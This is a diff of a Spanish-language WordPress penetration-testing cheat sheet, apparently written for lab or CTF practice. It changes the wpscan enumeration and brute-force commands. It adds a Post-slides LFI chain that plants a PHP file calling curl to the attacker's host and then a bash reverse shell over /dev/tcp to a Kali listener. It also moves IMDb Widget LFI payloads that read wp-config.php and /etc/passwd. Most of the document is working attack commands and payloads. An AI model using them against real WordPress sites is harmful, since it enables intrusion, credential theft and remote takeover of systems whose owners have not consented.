@@ -68,32 +68,24 @@ admin:password
 
 ## 2. WPSCAN TOOL — ENUMERACIÓN COMPLETA
 
-### Escaneo básico
-```bash
-❯ wpscan --url http://<IP>/
-# Detección básica → versión, plugins, temas, usuarios
-
-❯ wpscan --url http://<IP>/wp-login.php
-# Escaneo desde el login
-```
-
 ### Enumeración específica
 ```bash
-❯ wpscan --url http://<IP>/wordpress/ --enumerate u --no-update 
+❯ wpscan --url http://<IP>/ --enumerate u --no-update 
 # Enumerar usuarios sin actualizar la herramienta 
- 
-❯ wpscan --url http://<IP>/ -e 
-# Enumerar usuarios 
 
-❯ wpscan --url http://<IP> --api-token="<TOKEN>" --enumerate p --plugins-detection mixed  <- (MEJOR OPCIÓN USAR API TOKEN)
+TIP:
+	- admin:admin  # Probar siempre el usuario como user:password en login
+
+❯ wpscan --url http://<IP>/  -e ap --plugins-detection aggressive -t 40     <- IMPORTANTE
+# aggressive → más completo
+
+❯ wpscan --url http://<IP> --api-token="<TOKEN>" --enumerate p --plugins-detection mixed  <- (Mejor opción si se usa API Token)
+
 ❯ wpscan --url http://<IP>/ -e vp --api-token="<TOKEN>" 
 # Con API token → CVEs y detalles de vulnerabilidades
 
 ❯ wpscan --url http://<IP>/ -e u,vp,vt,dbe
 # vt → temas vulnerables | dbe → bases de datos expuestas
-
-❯ wpscan --url http://<IP>/  -e ap --plugins-detection aggressive     <- IMPORTANTE
-# aggressive → más completo | mixed → por defecto | passive → silencioso
 ```
 
 ### Fuerza bruta de credenciales
@@ -112,21 +104,6 @@ admin:password
 
 ❯ wpscan -t 20 --password-attack xmlrpc --url http://<IP>/ -U admin --passwords /usr/share/wordlists/rockyou.txt
 # Fuerza bruta vía xmlrpc → más rápido → sin rate limiting
-```
-
-### LFI vía plugins vulnerables 
-```bash
-# Plugin IMDb Widget 1.0.8 → LFI en pic.php
-❯ http://<IP>/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php
-# Descarga la imagen → cambiar extensión a .txt → leer contenido
-
-❯ wget "http://<IP>/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php" -O output.txt
-# Guardar directamente como .txt → leer el contenido
-
-# Paths útiles para LFI en WordPress
-../../../wp-config.php
-../../../../etc/passwd
-../../../wp-content/uploads/<archivo>
 ```
 
 ## 3. WPPROBE TOOL
@@ -249,6 +226,50 @@ Paso 3:
 
 ## 5. EXPLOTAR UN PLUGIN  VULNERABLE 
 
+### Post-slides <= 1.0.1 - LFI
+* [PoC](https://wpscan.com/vulnerability/eb0424cc-e60c-44a5-aa24-cd1fe042b27a/)
+```bash 
+# WORDPRESS (Usuario no admin) + NFS
+Paso 1:
+# Ingresar a wordpress:
+	- Ir a 'pages' y seleccionar 'Add Page' 
+	- Dar click en '[+]' para agregar un 'Shortcode'
+
+# Agregar la siguiente linea:
+	[post-slides skin="../../../../../../../../../../../../../../../../var/nfs/documents/shell"]
+
+
+NOTA:
+	- La ruta de '/var/nfs/documents/' viene del puerto expuesto 'NFS' en donde se creo el archivo 'shell.php' malicioso 
+	- Se agrega automáticamente el '.php' en la ruta. O se no colocarlo al apuntar a algún recurso 
+```
+
+```bash 
+Paso 2:
+# Verificar si hay conectividad con Kali
+# Crear el archivo dentro del dir en nfs '/var/nfs/documents/' con el siguiente contenido
+❯ echo '<?php system("curl IP_Kali/hi"); ?>' > shell.php 
+
+❯ python3 -m http.server 80  # Montar un servidor http para recibir la solicitud
+
+Paso 3: Desde Wordpress dar click en 'Publish' para apuntar al recurso dhell.php. Aunque marque error en la web, se muestra la conectividad en Kali al buscar el recurso 
+```
+
+```bash 
+Paso 4: Una vez confirmando la conectividad, subir el archivo 'bash.sh' al nfs con permisos se ejecución 
+
+# El contenido de 'bash.sh' es el siguiente:
+	#!/bin/bash
+	/bin/bash -i >& /dev/tcp/<IP_KALI>/443 0>&1
+
+# Actualizar el contenido de 'shell.php':
+❯ echo '<?php system("/bin/bash /var/nfs/documents/bash.sh"); ?>' > shell.php 
+ 
+Paso 5:
+# Ponerse en escucha en Kali para recibir la revershell 
+❯ rlwrap nc -nlvp 443 
+```
+
 ### Simple File List < 4.2.3 - Unauthenticated Arbitrary File Upload RCE
 * [PoC](https://wpscan.com/vulnerability/365da9c5-a8d0-45f6-863c-1b1926ffd574/)
 ```bash 
@@ -301,6 +322,19 @@ NOTA:
 http://IP/api/modular-connector/login/anything?origin=mo&type=foo
 ```
 
+### Plugin IMDb Widget 1.0.8 → LFI en pic.php
+```bash
+❯ http://<IP>/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php
+# Descarga la imagen → cambiar extensión a .txt → leer contenido
+
+❯ wget "http://<IP>/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php" -O output.txt
+# Guardar directamente como .txt → leer el contenido
+
+# Paths útiles para LFI en WordPress
+../../../wp-config.php
+../../../../etc/passwd
+../../../wp-content/uploads/<archivo>
+```
 
 ## 6. OBTENER RCE — PANEL DE ADMINISTRACIÓN (Dentro de Wordpress)
 
